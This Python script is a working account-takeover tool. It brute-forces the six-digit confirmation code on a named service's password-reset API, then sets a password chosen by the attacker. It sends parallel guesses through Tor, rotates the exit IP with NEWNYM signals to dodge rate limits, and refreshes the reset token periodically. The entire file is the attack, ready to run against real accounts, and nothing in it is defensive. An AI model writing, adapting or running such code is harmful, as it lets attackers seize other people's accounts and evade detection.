import grequests
import json
import os
import time
import datetime

#set this constant to the login you wish to reset the password
LOGIN = "EMAIL_OR_CELLPHONE"
#what password should I change into?
CHANGE_PASS_TO = "blabla123"
#this is the TOR control password, that is defined in torrc file, it has to be uppercased because meow
TOR_PASS = "PASS"
#the actual tor proxy port
TOR_PORT = 9150
#tor control port as defined in torrc file
TOR_CONTROLPORT = 9051
#how many simultaneous connections should be opened
NUM_THREADS = 5
#timeout for requests, expired requests get save in ERRORS_FILE to be retried in the future
TIMEOUT = 10
#if time for requests surpass the TIMEOUT this amount of times, change the IP
MAX_RETRIES = 5
#try password for this iterations before changing (50 is about 5 minutes on fast internet)
CHANGE_TOKEN_TRIES = 50
#first possible password, exclusive
FIRSTPASS = 124751
#last possible password, exclusive
LASTPASS = 200000

proxies = {'http':  'socks5://127.0.0.1:'+str(TOR_PORT),
           'https': 'socks5://127.0.0.1:'+str(TOR_PORT)}

token = ""

# signals TOR for a new connection, not using stem Control because it conflicts with grequests
def renew_connection(): #warning, connection is only renewed after 8secs
    req = grequests.get(url="http://127.0.0.1:"+str(TOR_CONTROLPORT))
    req.method = "AUTHENTICATE \"{}\"\r\nSIGNAL NEWNYM\r\n".format(TOR_PASS) #meow
    response = grequests.map([req])

def try_code_req(token,password,code):
    data = {"userToken":token,
            "newPassword":password,
            "confirmCode":code}
    req = grequests.put("https://76znvtx2wh.execute-api.us-west-2.amazonaws.com/production/quantum/account/change-password",
                        data=json.dumps(data),proxies=proxies,timeout=TIMEOUT,
                        headers={"Origin":"https://atlasquantum.com","Content-Type":"application/json"})
    return req

def get_token(login):
    global token
    print("requesting new token..."," "*30)
    data = {"login":login}
    req = grequests.post("https://76znvtx2wh.execute-api.us-west-2.amazonaws.com/production/quantum/account/change-password",
                            data=json.dumps(data), proxies=proxies)
    response = grequests.map([req])
    token = json.loads(response[0].text)["userToken"]
    print("got token", token)
    req = grequests.get("https://76znvtx2wh.execute-api.us-west-2.amazonaws.com/production/quantum/account/check-hash-password-change?UserToken="+token, proxies=proxies)
    grequests.map([req])

def display_ip():
    try:
        req = grequests.get("http://httpbin.org/ip", proxies=proxies)
        response = grequests.map([req])
        print("ip",json.loads(response[0].text)["origin"]," "*70,"\n")
    except Exception:
        pass

def exception_handler(request, exception):
    #print("exception trying code",json.loads(request.kwargs["data"])["confirmCode"]+":",exception," " * 50)
    pass

f = None

display_ip()
get_token(LOGIN)

passes = [str(i).zfill(6) for i in range(FIRSTPASS,LASTPASS)]
passes_group = list(zip(*[passes[i::NUM_THREADS] for i in range(NUM_THREADS)]))

print("starting...")

start = time.time()
elapsed = TIMEOUT
toolong = MAX_RETRIES
attempt = CHANGE_TOKEN_TRIES

while True:
    for i in passes_group:
        attempt -= 1
        if attempt < 0:
            attempt = CHANGE_TOKEN_TRIES
            get_token(LOGIN)
            break
        start = time.time()
        print("THREADS:", str(NUM_THREADS),
              "trying:", i[0], "-", i[-1],
              "speed:", "{:.2f}s/try".format(elapsed),
              " "*10, end="\r")
        if elapsed > TIMEOUT:
            toolong = toolong - 1
            if toolong < 0:
                toolong = MAX_RETRIES
                renew_connection()
                time.sleep(8) #delay for renewal
                display_ip()
        else:
            toolong = MAX_RETRIES
        reqs = [try_code_req(token, CHANGE_PASS_TO, j) for j in i]
        response = grequests.map(reqs,exception_handler=exception_handler)
        for j in response:
            try:
                data = json.loads(j.text)
                if not "result" in data.keys():
                    print("Odd Response:",data," "*30)
                elif data["result"]:
                    print("Key Found! Password changed!")
                    print(data)
                    exit(0)
            except Exception:
                pass
        elapsed = time.time()-start
